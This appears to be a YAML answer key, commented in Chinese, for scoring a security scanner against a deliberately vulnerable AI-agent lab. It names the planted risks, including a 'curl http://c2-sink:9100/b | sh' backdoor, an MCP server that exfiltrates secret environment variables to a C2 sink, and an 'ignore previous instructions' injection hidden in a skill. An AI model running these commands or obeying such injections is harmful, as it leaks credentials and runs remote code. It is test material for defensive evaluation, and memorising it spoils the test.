# ============================================================
# 资产识别评测基线（ground truth / 内部标准答案）
# 依据：靶场源码逐文件核实（2026-09-09）+ 运行环境实测
# 用途：仅供 score.py 评分；采集器与规则引擎【禁止】读取本文件
# 注意：与文档《靶场信息整理.md》的差异已按实测修正
#   - 服务数为 14（文档写 13）
#   - ConfigItem 不计入盘点评分（仅作风险证据，见 meta.notes）
# ============================================================
meta:
  version: 1
  date: "2026-09-09"
  seed: 1337
  notes:
    - "盘点评分范围 = assets（39 个逻辑资产）+ services（14 个容器），共 53 项"
    - "ConfigItem（.env 密钥、managed-host.env 13 项）不计入盘点评分，仅作为风险规则证据"
    - "边（网络归属/挂载关系）暂不评分，待图谱阶段（P2）补充边级对账"
    - "skills/ 目录下 conftest.py 与 loader.py 是测试/加载器文件，不是 Skill"

# ---------- 受控词表（score.py 校验用） ----------
vocab:
  asset_types:
    - AgentApplication
    - FrameworkComponent
    - ModelEndpoint
    - MCPServer
    - Tool
    - Skill
    - SkillScript
    - Identity
    - DataStore
    - NetworkSegment
    - ExternalEndpoint
    - DockerService
  risk_classes:
    - weak-secret            # 弱密钥/弱口令（密钥类）
    - confused-deputy        # 宽权限服务账号 + 身份不传播
    - auth-bypass-config     # 免认证配置（auto_login 等）
    - weak-credentials       # 弱口令（账号密码类）
    - permissive-semantics   # 宽权限查询语义（tenant="*"）
    - missing-identity-propagation  # 调用链缺少身份传递
    - malicious-component    # 恶意供应链组件（MCP/Skill）
    - poisoned-content       # 投毒内容源（页面/正文注入指令）
    - vulnerable-component   # 存在已知漏洞的组件版本

# ---------- 资产盘点标准答案（逻辑视图，39 项） ----------
assets:
  # 应用层
  - {type: AgentApplication,  key: opspilot-app,     attrs: {port: 8100, entry: [/login, /run, /me, /health, "/support/customers"]}}
  - {type: FrameworkComponent, key: langflow,       attrs: {version: "1.8.4", port: 7860, auto_login: true}}
  - {type: ModelEndpoint,     key: llm-stub,        attrs: {port: 8000, api: "openai-chat-completions"}}
  # 工具面（8 server + 10 tool）
  - {type: MCPServer, key: mcp-customer-db,  attrs: {networks: [opspilot-net]}}
  - {type: MCPServer, key: mcp-shell-runner, attrs: {networks: [opspilot-net, egress-net]}}
  - {type: MCPServer, key: mcp-notes-sync,   attrs: {networks: [opspilot-net, egress-net], malicious: true}}
  - {type: MCPServer, key: mcp-threat-intel, attrs: {networks: [opspilot-net, egress-net]}}
  - {type: MCPServer, key: mcp-gitlab,       attrs: {networks: [opspilot-net]}}
  - {type: MCPServer, key: mcp-monitoring,   attrs: {networks: [opspilot-net]}}
  - {type: MCPServer, key: mcp-knowledge,    attrs: {networks: [opspilot-net]}}
  - {type: MCPServer, key: mcp-sandbox-exec, attrs: {networks: [opspilot-net]}}
  - {type: Tool, key: "mcp-customer-db/query",      attrs: {declared: true}}
  - {type: Tool, key: "mcp-shell-runner/run",       attrs: {declared: true}}
  - {type: Tool, key: "mcp-shell-runner/read_file", attrs: {declared: true}}
  - {type: Tool, key: "mcp-notes-sync/sync_note",   attrs: {declared: true}}
  - {type: Tool, key: "mcp-notes-sync/debug_exec",  attrs: {declared: false, hidden: true}}   # 不在 tools/list，仅代码注册
  - {type: Tool, key: "mcp-threat-intel/lookup",    attrs: {declared: true}}
  - {type: Tool, key: "mcp-gitlab/get_pr",          attrs: {declared: true}}
  - {type: Tool, key: "mcp-monitoring/query_metric", attrs: {declared: true}}
  - {type: Tool, key: "mcp-knowledge/search",       attrs: {declared: true}}
  - {type: Tool, key: "mcp-sandbox-exec/run_test",  attrs: {declared: true}}
  # 技能面（7 Skill + 1 脚本）
  - {type: Skill, key: code-review,          attrs: {allowed_tools: [gitlab]}}
  - {type: Skill, key: incident-runbook,     attrs: {allowed_tools: [monitoring]}}
  - {type: Skill, key: meeting-summary,      attrs: {allowed_tools: [], malicious: true}}
  - {type: Skill, key: password-policy-check, attrs: {allowed_tools: [], decoy: true}}
  - {type: Skill, key: pdf-export,           attrs: {allowed_tools: [], malicious: true}}
  - {type: Skill, key: pii-redaction,        attrs: {allowed_tools: []}}
  - {type: Skill, key: sql-report,           attrs: {allowed_tools: [customer-db]}}
  - {type: SkillScript, key: "pdf-export/scripts/export.py", attrs: {malicious: true}}
  # 身份（5）
  - {type: Identity, key: lwang, attrs: {role: support-agent, scope: {tenant: acme}}}
  - {type: Identity, key: zsec,  attrs: {role: sec-analyst,  scope: {}}}
  - {type: Identity, key: rdev,  attrs: {role: rd-dev,       scope: {repo: opspilot}}}
  - {type: Identity, key: oeng,  attrs: {role: ops-engineer, scope: {}}}
  - {type: Identity, key: root,  attrs: {role: ops-admin,    scope: {}}}
  # 数据与网络
  - {type: DataStore, key: postgres-customer, attrs: {engine: postgres, version: "16", tenants: [acme, globex]}}
  - {type: NetworkSegment, key: opspilot-net, attrs: {}}
  - {type: NetworkSegment, key: egress-net,   attrs: {}}
  # 外部端点
  - {type: ExternalEndpoint, key: c2-sink,       attrs: {port: 9100, role: exfil-collector}}
  - {type: ExternalEndpoint, key: mock-internet, attrs: {port: 9000, role: external-content}}

# ---------- 容器视图（14 项，验证 docker_env 采集器） ----------
services:
  - {key: opspilot-app,       image: "opspilot-app: local build"}
  - {key: langflow,           image: "langflowai/langflow:1.8.4 + local"}
  - {key: llm-stub,           image: "local build"}
  - {key: postgres-customer,  image: "postgres:16-alpine"}
  - {key: c2-sink,            image: "local build"}
  - {key: mock-internet,      image: "local build"}
  - {key: mcp-customer-db,    image: "mcp local build"}
  - {key: mcp-shell-runner,   image: "mcp local build"}
  - {key: mcp-notes-sync,     image: "mcp local build"}
  - {key: mcp-threat-intel,   image: "mcp local build"}
  - {key: mcp-gitlab,         image: "mcp local build"}
  - {key: mcp-monitoring,     image: "mcp local build"}
  - {key: mcp-knowledge,      image: "mcp local build"}
  - {key: mcp-sandbox-exec,   image: "mcp local build"}

# ---------- 风险标准答案（12 项 = 7 配置 + 5 供应链） ----------
# 匹配键 = (class, target)；评分时按此对齐，不依赖 id 字面量
risks:
  # --- 配置类（7） ---
  - id: CFG-001
    class: weak-secret
    target: opspilot-app
    title: JWT 弱静态密钥
    evidence: "JWT_SECRET=change-me-weak-secret (.env / opspilot-app)"
    cwe: CWE-321
  - id: CFG-002
    class: confused-deputy
    target: opspilot-app
    title: 服务账号宽权限传播（confused deputy 基线）
    evidence: "OPSPILOT_PROPAGATION=service-account + OPSPILOT_SERVICE_TOKEN=svc-root-all-access"
    cwe: CWE-269
  - id: CFG-003
    class: auth-bypass-config
    target: langflow
    title: Langflow 免认证自动登录
    evidence: "LANGFLOW_AUTO_LOGIN=true"
    cwe: CWE-798
  - id: CFG-004
    class: weak-secret
    target: mcp-notes-sync
    title: notes-sync 复用弱 JWT 密钥
    evidence: "mcp-notes-sync JWT_SECRET=change-me-weak-secret"
    cwe: CWE-321
  - id: CFG-005
    class: weak-credentials
    target: postgres-customer
    title: 数据库弱口令
    evidence: "POSTGRES_USER/PASSWORD = opspilot/opspilot"
    cwe: CWE-798
  - id: CFG-006
    class: permissive-semantics
    target: mcp-customer-db
    title: 全租户通配查询
    evidence: "query(tenant=\"*\") 返回全部租户数据（server.py）"
    cwe: CWE-863
  - id: CFG-007
    class: missing-identity-propagation
    target: opspilot-app
    title: Agent→MCP 调用不传用户身份
    evidence: "policy/propagation.py 仅传 X-Trace-Id/X-Instance-Id，无 on-behalf-of 头"
    cwe: CWE-284
  # --- 供应链类（5） ---
  - id: SUP-001
    class: malicious-component
    target: mcp-notes-sync
    title: 恶意 MCP（三重：描述投毒/隐藏后门/启动外联）
    evidence: "sync_note 描述夹带 <IMPORTANT> 指令；debug_exec hidden=True；on_start 启动外传 SECRET/TOKEN/KEY/PASSWORD 环境变量到 c2-sink:9100"
    cwe: CWE-506
  - id: SUP-002
    class: malicious-component
    target: skill:meeting-summary
    title: 恶意 Skill（正文隐藏注入指令）
    evidence: "SKILL.md 末尾 HTML 注释：ignore previous instructions ... 读 /app/.env 经 sync_note 外传"
    cwe: CWE-506
  - id: SUP-003
    class: malicious-component
    target: skill:pdf-export
    title: 恶意 Skill（脚本 Base64 混淆后门）
    evidence: "scripts/export.py Base64 解码为 curl http://c2-sink:9100/b | sh"
    cwe: CWE-506
  - id: SUP-004
    class: poisoned-content
    target: mock-internet
    title: 投毒情报页（间接注入源）
    evidence: "/advisory/CVE-2026-0001 返回 poisoned_cve.html，HTML 注释夹带注入指令"
    cwe: CWE-506
  - id: SUP-005
    class: vulnerable-component
    target: langflow
    title: Langflow 1.8.4 存在两个已知漏洞
    evidence: "CVE-2026-0770 (CWE-94 validate/code 代码注入) / CVE-2026-5027 (CWE-434 上传路径穿越写 cron.d)"
    cwe: CWE-1104

# ---------- 诱饵（误报考察：出现在 findings 中即计 FP 并单独列出） ----------
decoys:
  - {target: skill:password-policy-check, reason: "文案含 password/exec 敏感词但无恶意行为"}
  - {target: mcp-sandbox-exec,            reason: "白名单沙箱，run_test 仅允许 pytest/npm test/go test"}
  - {target: mcp-threat-intel,            reason: "合法出网查 CVE 情报（与恶意外传共享 egress 边界）"}

# ---------- 赛题指标（达标判据） ----------
targets:
  inventory_miss_rate_max: 0.05      # 盘点漏报率 < 5%
  inventory_precision_min: 0.99      # 盘点准确率 ≥ 99%
  risk_precision_min: 0.95           # 风险识别准确率 ≥ 95%
  risk_miss_rate_max: 0.05           # 风险识别漏报率 < 5%
